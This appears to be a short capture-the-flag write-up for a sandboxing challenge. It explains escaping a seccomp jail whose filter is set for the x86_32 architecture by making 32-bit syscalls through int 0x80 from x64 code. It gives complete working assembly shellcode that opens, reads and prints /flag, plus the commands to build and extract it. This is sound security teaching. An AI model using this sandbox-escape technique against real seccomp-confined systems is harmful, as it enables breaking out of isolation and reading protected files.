# Sandboxing - Level 9
It's getting tricky ! This challenge was personally very fun to solve, you had to dig a little deeper understand new concepts and apply em to successfully solve this unique challenge.

We are asked to escape a seccomp jail using the following syscalls `fstat`, `lstat`, `stat` and `close`. The important thing to note here is that in the source code of the binary, you can see that seccomp is actually applying the filters for `x86_32` architecture, this also means that we are actually looking for the following syscalls `read`, `write`, `open` and `close`.

What happens here is that x64 binaries are able to execute x86 syscalls on certain conditions, all the arguments have to fit in the 32 bit versions of each registers in-use, we also have to use the same exact calling convention as in x86 when writing the syscalls (ebx, ecx, edx,...) and call the syscall using the `int 0x80` instruction.

The other tricky part was to find a buffer for our call to `read`, i got stuck quite some time because i was trying to use a variable in the bss section to use as a buffer for read, after a while i realized i could just use any writable section of memory (heap, shellcode buffer,...).

I used the following shellcode to solve this challenge.
```
.global _start
.intel_syntax noprefix
_start:
  mov rax, 5
  lea ebx, [rip+flag]
  xor ecx, ecx
  xor edx, edx
  int 0x80
  mov rax, 3
  mov rbx, 3
  mov ecx, 0x1337090
  mov rdx, 0x1000
  int 0x80
  mov rax, 4
  mov rbx, 1
  mov ecx, 0x1337090
  mov rdx, 0x1000
  int 0x80
  mov rax, 1
  mov edi, 69
  int 0x80
flag:
  .ascii "/flag\0"
```

You can compile the shellcode and extract the `.text` section using the following 2 commands.
```
$ gcc -w -nostdlib -static shellcode.s -o shellcode
$ objcopy --dump-section .text=shellcode.bytes shellcode
```
